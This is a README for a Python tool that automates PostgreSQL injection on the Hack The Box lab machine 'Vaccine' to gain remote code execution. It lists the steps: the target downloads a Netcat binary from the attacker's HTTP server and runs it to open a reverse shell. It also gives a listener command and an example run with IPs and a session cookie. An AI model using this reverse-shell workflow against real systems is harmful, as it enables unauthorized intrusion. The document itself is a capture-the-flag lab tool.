# PostgreSQL-Shell

## DESCRIPTION
A Python program that automates the process of error-based PostgreSQL injection RCE on the MegaCorp Car Catalogue-
Website running on of one of the Hack The Box's machine 'Vaccine' http://10.10.10.46/dashboard.php

It provides reverse shell connection to the attacker by mainly doing the followings:
1. Copies the origial Netcat file (/usr/bin/nc) to the local /tmp directory of the attacker's machine.
2. Sets up an HTTP server on the local /tmp directory.
3. Creates a new table in the database of the target server.
4. Injects a query that initiates a file transfer command to download a Netcat binary file from attacker's machine.
5. Injects a query that executes the downloaded Netcat to initiate reverse shell.

This is to be used for educational and security testing purposes only and I'm not responsible for the misuse of this program.

## ORIGINAL SOURCE
https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine

Modifier: lkim94

## CAUTION
The shell disconnects when there's a few minutes of inactivity.
Terminating this program's process while the shell is active can also cause unexpected disconnection.

## USAGE
1. `nc -lvnp <listen_port#>`

![PostgreSQL-ShellyPoC1](https://user-images.githubusercontent.com/83319068/130559443-c6f3554e-2a73-41a9-bb38-603e912230be.png)

2. `python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>`

![PostgreSQL-ShellyPoC2](https://user-images.githubusercontent.com/83319068/130559455-4b39932e-c68f-4cdf-bdfd-c178b7355f08.png)
![PostgreSQL-ShellyPoC3](https://user-images.githubusercontent.com/83319068/130559467-07d92f93-db36-43a7-8243-b8e5444b8733.png)

## EXAMPLE
`python3 PostgreSQL-Shell.py -L 10.10.14.44 -l 4444 -t 10.10.10.46 -p dashboard.php?search=car -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem`
